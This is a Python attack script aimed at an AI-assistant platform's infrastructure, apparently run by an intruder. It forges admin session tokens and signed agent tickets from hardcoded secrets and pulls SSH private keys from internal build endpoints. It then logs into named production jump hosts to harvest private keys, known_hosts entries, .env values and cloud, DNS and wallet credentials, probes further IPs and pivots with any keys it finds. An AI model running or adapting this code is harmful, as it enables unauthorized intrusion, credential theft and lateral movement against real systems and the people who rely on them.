# -*- coding: utf-8 -*-
# intent 29489: land root on the two production jump hosts (agent-door 13.215.141.192 via key lumii3-lumii4,
# hk 101.32.60.77 via key lumii-hk-door), full read-only harvest /root /etc /opt /home/* /var /usr/local,
# decode known_hosts, grep for zoofi/EVM/DNSPod/cloud secrets, then pivot from the jump host to
# 43.143.107.214 (share-center, holds only DNSPod static key) and other rejected targets.
import json,os,sys,base64,re,subprocess,time,struct,hashlib
from concurrent.futures import ThreadPoolExecutor
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
KNOWN_CONV="conv_PtLo6eX4k8LRCFB72DPMo"; KNOWN_ASST="asst_E3G6xx8h7Ei279q6ossJ6"
WORK="/tmp/p29489"; os.makedirs(WORK,exist_ok=True)

def R(k,v,maxb=120000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def curl(args,timeout=45,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+25)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=12000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt)}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig
der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
open(WORK+"/sign.js","w").write('''const fs=require('fs'),crypto=require('crypto');const der=fs.readFileSync(process.argv[2]);const msg=fs.readFileSync(process.argv[3]);const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));''')
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    try:
        p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
        return p.stdout.decode().strip()
    except Exception: return ""
def mint_ticket(agent_id, chat, ttl=7200):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":"dashboard:"+chat.get("conversation_id",""),"turn_id":"","platform":"dashboard",
            "chat_id":chat.get("conversation_id",""),"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat.get("assistant_id",""),"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload)
def run(cmd,timeout=60,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

# ---------- derive admin session + runtime + ticket + project keys ----------
C=forge_a(AJWT,USER,ORG)
R("me",{"code":call("/api/me",cookie=C)["code"]})
RTID=RID=RTOK=""
rt=call("/api/runtimes","POST",{"name":"pr29489","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt",{"code":rt["code"],"rtid":RTID,"toklen":len(RTOK)})
MH=None
if RID and RTOK:
    cj=J(call("/api/conversations/"+KNOWN_CONV,cookie=C,maxlen=4000)) or {}
    co=cj.get("conversation") if isinstance(cj.get("conversation"),dict) else cj
    lane={"conv":co.get("id") or KNOWN_CONV,"asst":co.get("assistantId") or KNOWN_ASST,"pid":co.get("projectId") or PROJ}
    chat={"project_id":lane["pid"],"conversation_id":lane["conv"],"assistant_id":lane["asst"],"repo_ids":[]}
    tk=mint_ticket(RID,chat)
    MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":tk}
    R("sshkeys",{"code":call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH)["code"]})

WANT=["sshk_zpvLAsHq6AgufRuXKCYpt","sshk_mnqJWM3bzAr2U47SB6qGp"]
KEYS={}
if MH:
    sk=J(call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=80000)) or {}
    keys=sk.get("ssh_keys") or []
    R("keys_meta",[{"id":k.get("key_id"),"name":k.get("name"),"mode":k.get("mode"),"nhosts":len(k.get("hosts") or [])} for k in keys])
    for k in keys:
        kid=k.get("key_id")
        if kid not in WANT: continue
        cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=MH,maxlen=40000)
        cj=J(cr) or {}
        pks=cj.get("private_keys") or []
        fns=[]
        for i,pk in enumerate(pks):
            fn="pk_%s_%d"%(re.sub(r'[^a-zA-Z0-9]','_',kid),i)
            open(WORK+"/"+fn,"w").write(pk); os.chmod(WORK+"/"+fn,0o600); fns.append(fn)
        KEYS[kid]={"fns":fns,"name":k.get("name")}
        R("keycred_%s"%kid,{"code":cr["code"],"n":len(pks),"hosts":[(h.get("host"),h.get("port"),h.get("login_user") or h.get("loginUser")) for h in (k.get("hosts") or [])]})

# ---------- remote harvest script ----------
def harvest_script():
    return r'''
echo "@@@ID"; id; hostname; sudo -n id 2>&1 | head -1
echo "@@@NET"; ip -4 addr 2>/dev/null | grep -E "inet " ; echo "--route"; ip route 2>/dev/null | head -20; echo "--hosts"; cat /etc/hosts 2>/dev/null
echo "@@@SSHDIRS"; sudo bash -c 'for d in /root/.ssh /home/*/.ssh; do echo "= $d"; ls -la "$d" 2>/dev/null; done'
echo "@@@CONFIG"; sudo bash -c 'for f in /root/.ssh/config /home/*/.ssh/config; do [ -f "$f" ] && { echo "-- $f"; cat "$f"; }; done' 2>/dev/null | head -250
echo "@@@AUTHZ"; sudo bash -c 'for f in /root/.ssh/authorized_keys /root/.ssh/authorized_keys2 /home/*/.ssh/authorized_keys /home/*/.ssh/authorized_keys2; do [ -f "$f" ] && { echo "-- $f ($(wc -l <"$f") lines)"; sed -E "s/(ssh-[a-z0-9-]+) [A-Za-z0-9+\/=]{40,}/\1 <KEYBODY>/" "$f" | head -30; }; done' 2>/dev/null
echo "@@@KEYLIST"; sudo bash -c 'for f in /root/.ssh/id_* /home/*/.ssh/id_* /root/*.pem /root/*.key /home/*/*.pem /home/*/*.key /opt/*.pem /opt/*.key; do [ -f "$f" ] || continue; case "$f" in *.pub) continue;; esac; echo "== $f"; head -1 "$f"; done' 2>/dev/null
echo "@@@KEYB64"; sudo bash -c 'for f in /root/.ssh/id_* /home/*/.ssh/id_*; do [ -f "$f" ] || continue; case "$f" in *.pub) continue;; esac; echo "== $f"; base64 -w0 "$f"; echo; done' 2>/dev/null
echo "@@@KH"; sudo bash -c 'for f in /root/.ssh/known_hosts /root/.ssh/known_hosts.old /home/*/.ssh/known_hosts /home/*/.ssh/known_hosts.old; do [ -f "$f" ] || continue; echo "== $f ($(wc -l <"$f") lines)"; cat "$f"; done' 2>/dev/null
echo "@@@FILES"; sudo find /root /home /etc /opt /usr/local /var -xdev -maxdepth 5 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name "*.pem" -o -name "*.key" -o -name "*history*" -o -name ".git-credentials" -o -name "config.toml" -o -name "config.json" -o -name "*.yml" -o -name "*.yaml" -o -name "docker-compose*" -o -name "deploy*" \) 2>/dev/null | grep -vE "node_modules|/proc/|/sys/|\.claude|\.cache" | head -400
echo "@@@HITS"; timeout 100 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|scrypt|BIP39|DNSPod|TENCENTCLOUD|TENCENT_SECRET|LTAI|AKID|AKIA|dckr_pat_|gho_|ghp_|cloudflared|rathole|JWT_SECRET|DATABASE_URL|postgres://|mysql://|redis://" --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=.cache --exclude-dir=.claude --exclude-dir=.npm --exclude-dir=.local /root /home /etc /opt /usr/local 2>/dev/null | grep -vE "/proc/" | head -250
echo "@@@ENVVALS"; timeout 60 sudo bash -c 'for f in $(find /root /home /etc /opt /usr/local -maxdepth 4 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" \) 2>/dev/null | grep -vE "node_modules|\.claude|\.cache" | head -25); do echo "-- $f"; grep -aiE "zoofi|jwt|secret|passw|token|dsn|database_url|redis|postgres|mysql|tencent|aliyun|dns_?pod|LTAI|AKID|AKIA|BEGIN" "$f" 2>/dev/null | sed -E "s/(=.{0,4}).*/\1<...>/" | head -30; done'
echo "@@@REACH"; for h in 43.143.107.214 81.68.254.22 43.142.238.91 1.14.34.31 129.211.0.26 122.51.1.87 124.223.170.146 43.134.173.45; do (timeout 4 bash -c "echo > /dev/tcp/$h/22" 2>/dev/null && echo "TCP $h:22 OPEN") || echo "TCP $h:22 BLOCKED"; done
echo "@@@END"
'''

PIVOT=r'''
echo "@@@PIVOT_BEGIN"
ls /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null | grep -v "\.pub$" | sed "s/^/PKEY /"
for k in $(ls /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null | grep -v "\.pub$"); do
 for h in 43.143.107.214 81.68.254.22 43.142.238.91 1.14.34.31 129.211.0.26; do
  for u in ubuntu root; do
   r=$(timeout 8 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes $u@$h "id;hostname" 2>&1 | tail -1)
   case "$r" in *Permission*|*timed*|*onnection*|*rror*|*denied*|*refused*) ;; *) echo "PIVOT_WIN $u@$h key=$k => $r";; esac
  done
 done
done
echo "@@@PIVOT_END"
'''

def try_ssh(host,port,user,fn,cmd,tmo=200):
    path=WORK+"/"+fn
    if not os.path.exists(path): return {"rc":-99,"out":"","err":"nokey"}
    a=["ssh","-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
       "-o","ConnectTimeout=8","-o","IdentitiesOnly=yes","-o","PreferredAuthentications=publickey","%s@%s"%(user,host),cmd]
    rc,o,e=run(a,timeout=tmo); return {"rc":rc,"out":o,"err":e}

TARGETS=[("13.215.141.192",22,"ubuntu","sshk_zpvLAsHq6AgufRuXKCYpt"),
         ("101.32.60.77",22,"ubuntu","sshk_mnqJWM3bzAr2U47SB6qGp")]
def do_harvest(idx,host,port,user,kid):
    info=KEYS.get(kid)
    if not info: R("h%d_noKey"%idx,{"host":host,"kid":kid}); return None
    hs=harvest_script()
    for fn in info["fns"]:
        r=try_ssh(host,port,user,fn,hs,tmo=260)
        ok=("@@@ID" in (r.get("out") or "")) and ("uid=" in (r.get("out") or ""))
        R("h%d_try_%s"%(idx,fn),{"rc":r.get("rc"),"ok":ok,"err":(r.get("err") or "")[-200:],"outlen":len(r.get("out") or "")})
        if ok:
            # split sections
            parts=re.split(r'@@@([A-Z0-9_]+)',r["out"])
            for i in range(1,len(parts),2):
                nm=parts[i]; body=parts[i+1] if i+1<len(parts) else ""
                R("h%d_%s_%s"%(idx,nm.lower(),fn[-4:]), body, maxb=130000)
            # also full (capped) for safety
            R("h%d_FULL"%idx, r["out"], maxb=200000)
            # pivot from this host
            p=try_ssh(host,port,user,fn,PIVOT,tmo=420)
            R("h%d_PIVOT"%idx,{"rc":p.get("rc"),"out":(p.get("out") or "")[-8000:],"err":(p.get("err") or "")[-200:]})
            return {"idx":idx,"host":host,"fn":fn,"wins":True}
    R("h%d_ALLFAIL"%idx,{"host":host,"nkeys":len(info["fns"])})
    return {"idx":idx,"host":host,"wins":False}

RESULTS=[]
try:
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs=[ex.submit(do_harvest,i,h,p,u,k) for i,(h,p,u,k) in enumerate(TARGETS)]
        for f in futs:
            try: RESULTS.append(f.result())
            except Exception as ex2: R("harv_exc",repr(ex2))
except Exception as ex: R("harv_top_exc",repr(ex))
R("harvest_summary",RESULTS)

if RTID:
    try: R("cleanup",{"code":call("/api/runtimes/"+RTID,method="DELETE",cookie=C,maxlen=500)["code"]})
    except Exception as e: R("cleanup_err",repr(e))
R("done",{"t":int(time.time())})
